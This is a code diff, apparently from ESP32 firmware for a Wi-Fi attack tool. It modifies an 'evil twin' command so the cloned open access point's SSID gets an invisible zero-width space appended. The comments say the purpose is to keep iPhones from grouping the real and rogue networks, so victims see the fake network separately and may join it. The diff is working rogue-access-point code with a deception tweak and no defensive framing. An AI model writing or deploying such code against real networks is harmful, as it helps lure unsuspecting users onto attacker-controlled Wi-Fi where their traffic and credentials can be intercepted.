@@ -1542,8 +1542,23 @@ static int cmd_start_evil_twin(int argc, char **argv) {
                     .authmode = WIFI_AUTH_OPEN
                 }
             };
-            strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
-            ap_config.ap.ssid_len = strlen(evilTwinSSID);
+            
+            // Copy original SSID and add Zero Width Space (U+200B) at the end
+            // This prevents iPhone from grouping original and twin networks together
+            size_t ssid_len = strlen(evilTwinSSID);
+            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
+                // Copy original SSID
+                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
+                ap_config.ap.ssid[ssid_len] = 0xE2;
+                ap_config.ap.ssid[ssid_len + 1] = 0x80;
+                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
+                ap_config.ap.ssid_len = ssid_len + 3;
+            } else {
+                // SSID too long, just copy without Zero Width Space
+                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+                ap_config.ap.ssid_len = strlen(evilTwinSSID);
+            }
             
             // WiFi is already running in APSTA mode from wifi_init_ap_sta()
             // Just update the AP configuration
@@ -1554,7 +1569,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
                 return 1;
             }
             
-            MY_LOG_INFO(TAG, "AP configuration updated with Evil Twin SSID");
+            MY_LOG_INFO(TAG, "AP configuration updated with Evil Twin SSID (with Zero Width Space)");
             
             // Start DHCP server
             ret = esp_netif_dhcps_start(ap_netif);
